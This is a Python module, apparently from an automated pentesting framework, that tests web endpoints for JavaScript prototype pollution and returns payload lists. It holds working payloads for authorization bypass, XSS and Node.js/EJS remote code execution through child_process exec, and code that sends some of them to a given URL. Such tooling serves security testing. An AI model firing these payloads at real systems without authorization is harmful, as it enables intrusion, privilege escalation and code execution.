"""Prototype Pollution testing tool for JavaScript/Node.js applications."""

from __future__ import annotations

import json
from typing import Any, Literal
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


PrototypePollutionAction = Literal["test_client", "test_server", "generate_payloads", "analyze"]

# Prototype pollution payloads
PP_PAYLOADS = {
    "basic": [
        {"__proto__": {"polluted": "true"}},
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"__proto__.polluted": "true"},
    ],
    "rce_node": [
        {"__proto__": {"shell": "/bin/bash", "NODE_OPTIONS": "--require /proc/self/environ"}},
        {"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/payload.js"}}},
        {"constructor": {"prototype": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id')//"}}},
    ],
    "ejs_rce": [
        {"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}},
        {"__proto__": {"client": "true", "escapeFunction": "1;return global.process.mainModule.constructor._load('child_process').execSync('id')"}},
    ],
    "xss": [
        {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
        {"__proto__": {"src": "javascript:alert(1)"}},
    ],
    "bypass": [
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"verified": True}},
    ],
}

# Pollution paths for URL parameters
PP_URL_PAYLOADS = [
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "constructor[prototype][polluted]=true",
    "constructor.prototype.polluted=true",
    "__proto__[isAdmin]=true",
    "__proto__[admin]=true",
]


def _test_client_pollution(
    url: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for client-side prototype pollution."""
    results: dict[str, Any] = {
        "url": url,
        "vulnerability_type": "client-side",
        "tests": [],
        "vulnerable": False,
    }

    # Test URL parameter pollution
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for payload in PP_URL_PAYLOADS:
        test_url = f"{base_url}?{payload}"

        try:
            response = requests.get(test_url, timeout=timeout)
            test_result: dict[str, Any] = {
                "payload": payload,
                "status_code": response.status_code,
            }

            # Check if payload is reflected
            if "polluted" in response.text or "__proto__" in response.text:
                test_result["reflected"] = True
                results["vulnerable"] = True

            results["tests"].append(test_result)
        except requests.exceptions.RequestException as e:
            results["tests"].append({"payload": payload, "error": str(e)})

    # Test JSON body pollution
    for payload_type, payloads in PP_PAYLOADS.items():
        if payload_type not in ["basic", "xss", "bypass"]:
            continue

        for payload in payloads:
            try:
                response = requests.post(url, json=payload, timeout=timeout)
                test_result = {
                    "payload_type": payload_type,
                    "payload": str(payload)[:100],
                    "status_code": response.status_code,
                }

                if response.status_code == 200:
                    test_result["accepted"] = True
                    if "polluted" in response.text.lower():
                        results["vulnerable"] = True
                        test_result["pollution_indicator"] = True

                results["tests"].append(test_result)
            except requests.exceptions.RequestException as e:
                results["tests"].append({"error": str(e)})

    if results["vulnerable"]:
        results["recommendations"] = [
            "Sanitize user input before object merging",
            "Use Object.create(null) for safe objects",
            "Freeze Object.prototype",
            "Validate JSON structure before processing",
        ]

    return results


def _test_server_pollution(
    url: str,
    method: str = "POST",
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for server-side prototype pollution (Node.js)."""
    results: dict[str, Any] = {
        "url": url,
        "vulnerability_type": "server-side",
        "tests": [],
        "vulnerable": False,
    }

    # Test RCE payloads (safer detection methods)
    for payload_type in ["basic", "bypass"]:
        for payload in PP_PAYLOADS.get(payload_type, []):
            try:
                if method.upper() == "GET":
                    # URL parameter pollution
                    response = requests.get(url, params=payload, timeout=timeout)
                else:
                    response = requests.post(url, json=payload, timeout=timeout)

                test_result: dict[str, Any] = {
                    "payload_type": payload_type,
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                }

                # Check for pollution indicators
                if "polluted" in response.text.lower():
                    results["vulnerable"] = True
                    test_result["indicator"] = "Pollution value reflected"

                # Check for behavior change
                if response.status_code == 500:
                    test_result["server_error"] = True
                    results["potential_vulnerable"] = True

                results["tests"].append(test_result)
            except requests.exceptions.RequestException as e:
                results["tests"].append({"error": str(e)})

    # Test status/role bypass
    bypass_tests = PP_PAYLOADS.get("bypass", [])
    for payload in bypass_tests:
        try:
            response = requests.post(url, json=payload, timeout=timeout)

            # Check if response indicates elevated privileges
            for indicator in ["admin", "role", "authenticated", "authorized"]:
                if indicator in response.text.lower():
                    results["privilege_escalation_indicator"] = True
                    results["vulnerable"] = True
                    break
        except requests.exceptions.RequestException:
            pass

    if results.get("vulnerable") or results.get("potential_vulnerable"):
        results["recommendations"] = [
            "Implement input validation for JSON objects",
            "Use libraries like lodash.set() with safeguards",
            "Consider using --disable-proto=throw Node.js flag",
            "Audit all object merge/assign operations",
        ]

    return results


def _generate_payloads(
    target_type: str = "all",
) -> dict[str, Any]:
    """Generate prototype pollution payloads."""
    results: dict[str, Any] = {
        "payloads": {},
    }

    if target_type == "all":
        results["payloads"] = PP_PAYLOADS
    elif target_type in PP_PAYLOADS:
        results["payloads"] = {target_type: PP_PAYLOADS[target_type]}
    else:
        results["available_types"] = list(PP_PAYLOADS.keys())
        results["error"] = f"Unknown payload type: {target_type}"

    results["url_payloads"] = PP_URL_PAYLOADS

    results["usage_notes"] = {
        "basic": "Simple pollution detection",
        "rce_node": "Node.js RCE via environment manipulation",
        "ejs_rce": "EJS template engine RCE",
        "xss": "Client-side XSS via prototype",
        "bypass": "Authorization bypass via prototype",
    }

    return results


def _analyze_endpoint(
    url: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Analyze endpoint for prototype pollution vulnerability surface."""
    results: dict[str, Any] = {
        "url": url,
        "analysis": {},
        "risk_level": "unknown",
    }

    try:
        # Test if endpoint accepts JSON
        response = requests.post(
            url,
            json={"test": "value"},
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )

        results["analysis"]["accepts_json"] = response.status_code != 415

        # Check server type
        server = response.headers.get("Server", "")
        x_powered = response.headers.get("X-Powered-By", "")

        results["analysis"]["server"] = server
        results["analysis"]["x_powered_by"] = x_powered

        # Check if Node.js/Express
        if any(ind in x_powered.lower() for ind in ["express", "node"]):
            results["analysis"]["nodejs_detected"] = True
            results["risk_level"] = "HIGH"

        # Check for merge operations in response
        if any(op in response.text.lower() for op in ["merge", "extend", "assign", "lodash"]):
            results["analysis"]["merge_operation_hint"] = True
            results["risk_level"] = "HIGH"

        # Determine risk
        if results["analysis"].get("accepts_json") and results["analysis"].get("nodejs_detected"):
            results["recommendations"] = [
                "Test with __proto__ payloads in JSON body",
                "Check for lodash/underscore merge functions",
                "Test both POST and PUT methods",
            ]

    except requests.exceptions.RequestException as e:
        results["error"] = str(e)

    return results


@register_tool
def prototype_pollution_tester(
    action: PrototypePollutionAction,
    url: str | None = None,
    method: str = "POST",
    target_type: str = "all",
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """Test for Prototype Pollution vulnerabilities in JavaScript/Node.js applications.

    Prototype pollution allows attackers to modify JavaScript object prototypes,
    potentially leading to RCE, XSS, or authorization bypass.

    Args:
        action: The testing action to perform:
            - test_client: Test for client-side prototype pollution
            - test_server: Test for server-side prototype pollution (Node.js)
            - generate_payloads: Generate prototype pollution payloads
            - analyze: Analyze endpoint for vulnerability surface
        url: Target URL for testing
        method: HTTP method to use (GET or POST)
        target_type: Payload type for generate_payloads (basic, rce_node, ejs_rce, xss, bypass, all)
        timeout: Request timeout in seconds

    Returns:
        Prototype pollution test results with vulnerability indicators
    """
    VALID_PARAMS = {"action", "url", "method", "target_type", "timeout"}
    VALID_ACTIONS = ["test_client", "test_server", "generate_payloads", "analyze"]

    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "prototype_pollution_tester")
    if unknown_error:
        unknown_error.update(generate_usage_hint("prototype_pollution_tester", "test_server", {"url": "https://example.com/api"}))
        return unknown_error

    action_error = validate_action_param(action, VALID_ACTIONS, "prototype_pollution_tester")
    if action_error:
        return action_error

    try:
        if action == "test_client":
            url_error = validate_required_param(url, "url", action, "prototype_pollution_tester")
            if url_error:
                return url_error
            return _test_client_pollution(url, timeout)

        if action == "test_server":
            url_error = validate_required_param(url, "url", action, "prototype_pollution_tester")
            if url_error:
                return url_error
            return _test_server_pollution(url, method, timeout)

        if action == "generate_payloads":
            return _generate_payloads(target_type)

        if action == "analyze":
            url_error = validate_required_param(url, "url", action, "prototype_pollution_tester")
            if url_error:
                return url_error
            return _analyze_endpoint(url, timeout)

        return {"error": f"Unknown action: {action}"}

    except Exception as e:
        return {"error": f"Prototype pollution testing failed: {e!s}"}
